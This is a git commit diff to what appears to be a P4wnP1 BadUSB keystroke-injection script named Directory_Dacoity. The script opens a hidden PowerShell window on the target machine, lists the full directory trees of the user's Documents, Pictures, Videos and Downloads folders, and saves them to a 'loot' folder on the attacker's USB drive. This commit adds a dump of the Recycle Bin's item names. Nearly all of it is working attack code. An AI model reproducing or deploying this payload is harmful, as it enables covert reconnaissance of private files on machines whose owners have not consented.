1d20fe2eec6fc0804279a43926eb24bf0b42e8ff
AdamWHY2K <68286215+AdamWHY2K@users.noreply.github.com>
2021-06-03 16:23:51 +0100

    Added recycle bin

--- Directory_Dacoity/DIrectory_Dacoity.js
+++ Directory_Dacoity/DIrectory_Dacoity.js
@@ -11,7 +11,7 @@ if (hide) type("powershell -w h -NoP -NonI\n"); else type("powershell\n"); //Hid
 delay(1000);
 type("$usbPath =((gwmi win32_volume -f 'label=''P4WNP1''').Name)\n");	   //Replace 'P4WNP1' with your drive name
 delay(100);
-type("tree /F /A ([Environment]::GetFolderPath('MyDocuments')) > $usbPath\\loot\\$env:COMPUTERNAME-Documents_Dir.txt;tree /F /A ([Environment]::GetFolderPath('MyPictures')) > $usbPath\\loot\\$env:COMPUTERNAME-Pictures_Dir.txt;tree /F /A ([Environment]::GetFolderPath('MyVideos')) > $usbPath\\loot\\$env:COMPUTERNAME-Videos_Dir.txt;tree /F /A $env:USERPROFILE\\Downloads > $usbPath\\loot\\$env:COMPUTERNAME-Downloads_Dir.txt\n");
+type("tree /F /A ([Environment]::GetFolderPath('MyDocuments')) > $usbPath\\loot\\$env:COMPUTERNAME-Documents_Dir.txt;tree /F /A ([Environment]::GetFolderPath('MyPictures')) > $usbPath\\loot\\$env:COMPUTERNAME-Pictures_Dir.txt;tree /F /A ([Environment]::GetFolderPath('MyVideos')) > $usbPath\\loot\\$env:COMPUTERNAME-Videos_Dir.txt;tree /F /A $env:USERPROFILE\\Downloads > $usbPath\\loot\\$env:COMPUTERNAME-Downloads_Dir.txt; $shell = New-Object -com shell.application; $rb = $shell.Namespace(10); $items = @(); $items += $rb.items(); Write-Output '----------------Recycle Bin Start----------------', $items.name, Write-Output '----------------Recycle Bin End----------------' > $usbPath\\loot\\$env:COMPUTERNAME-Bin_Dir.txt\n");
 /*
 ([Environment]::GetFolderPath('MyDocuments')) returns the path to Documents even if the user has moved it from the default C: drive to another drive
 Unfortunately Downloads isn't supported in that format so we can only return the default Downloads path using env:USERPROFILE\\Downloads
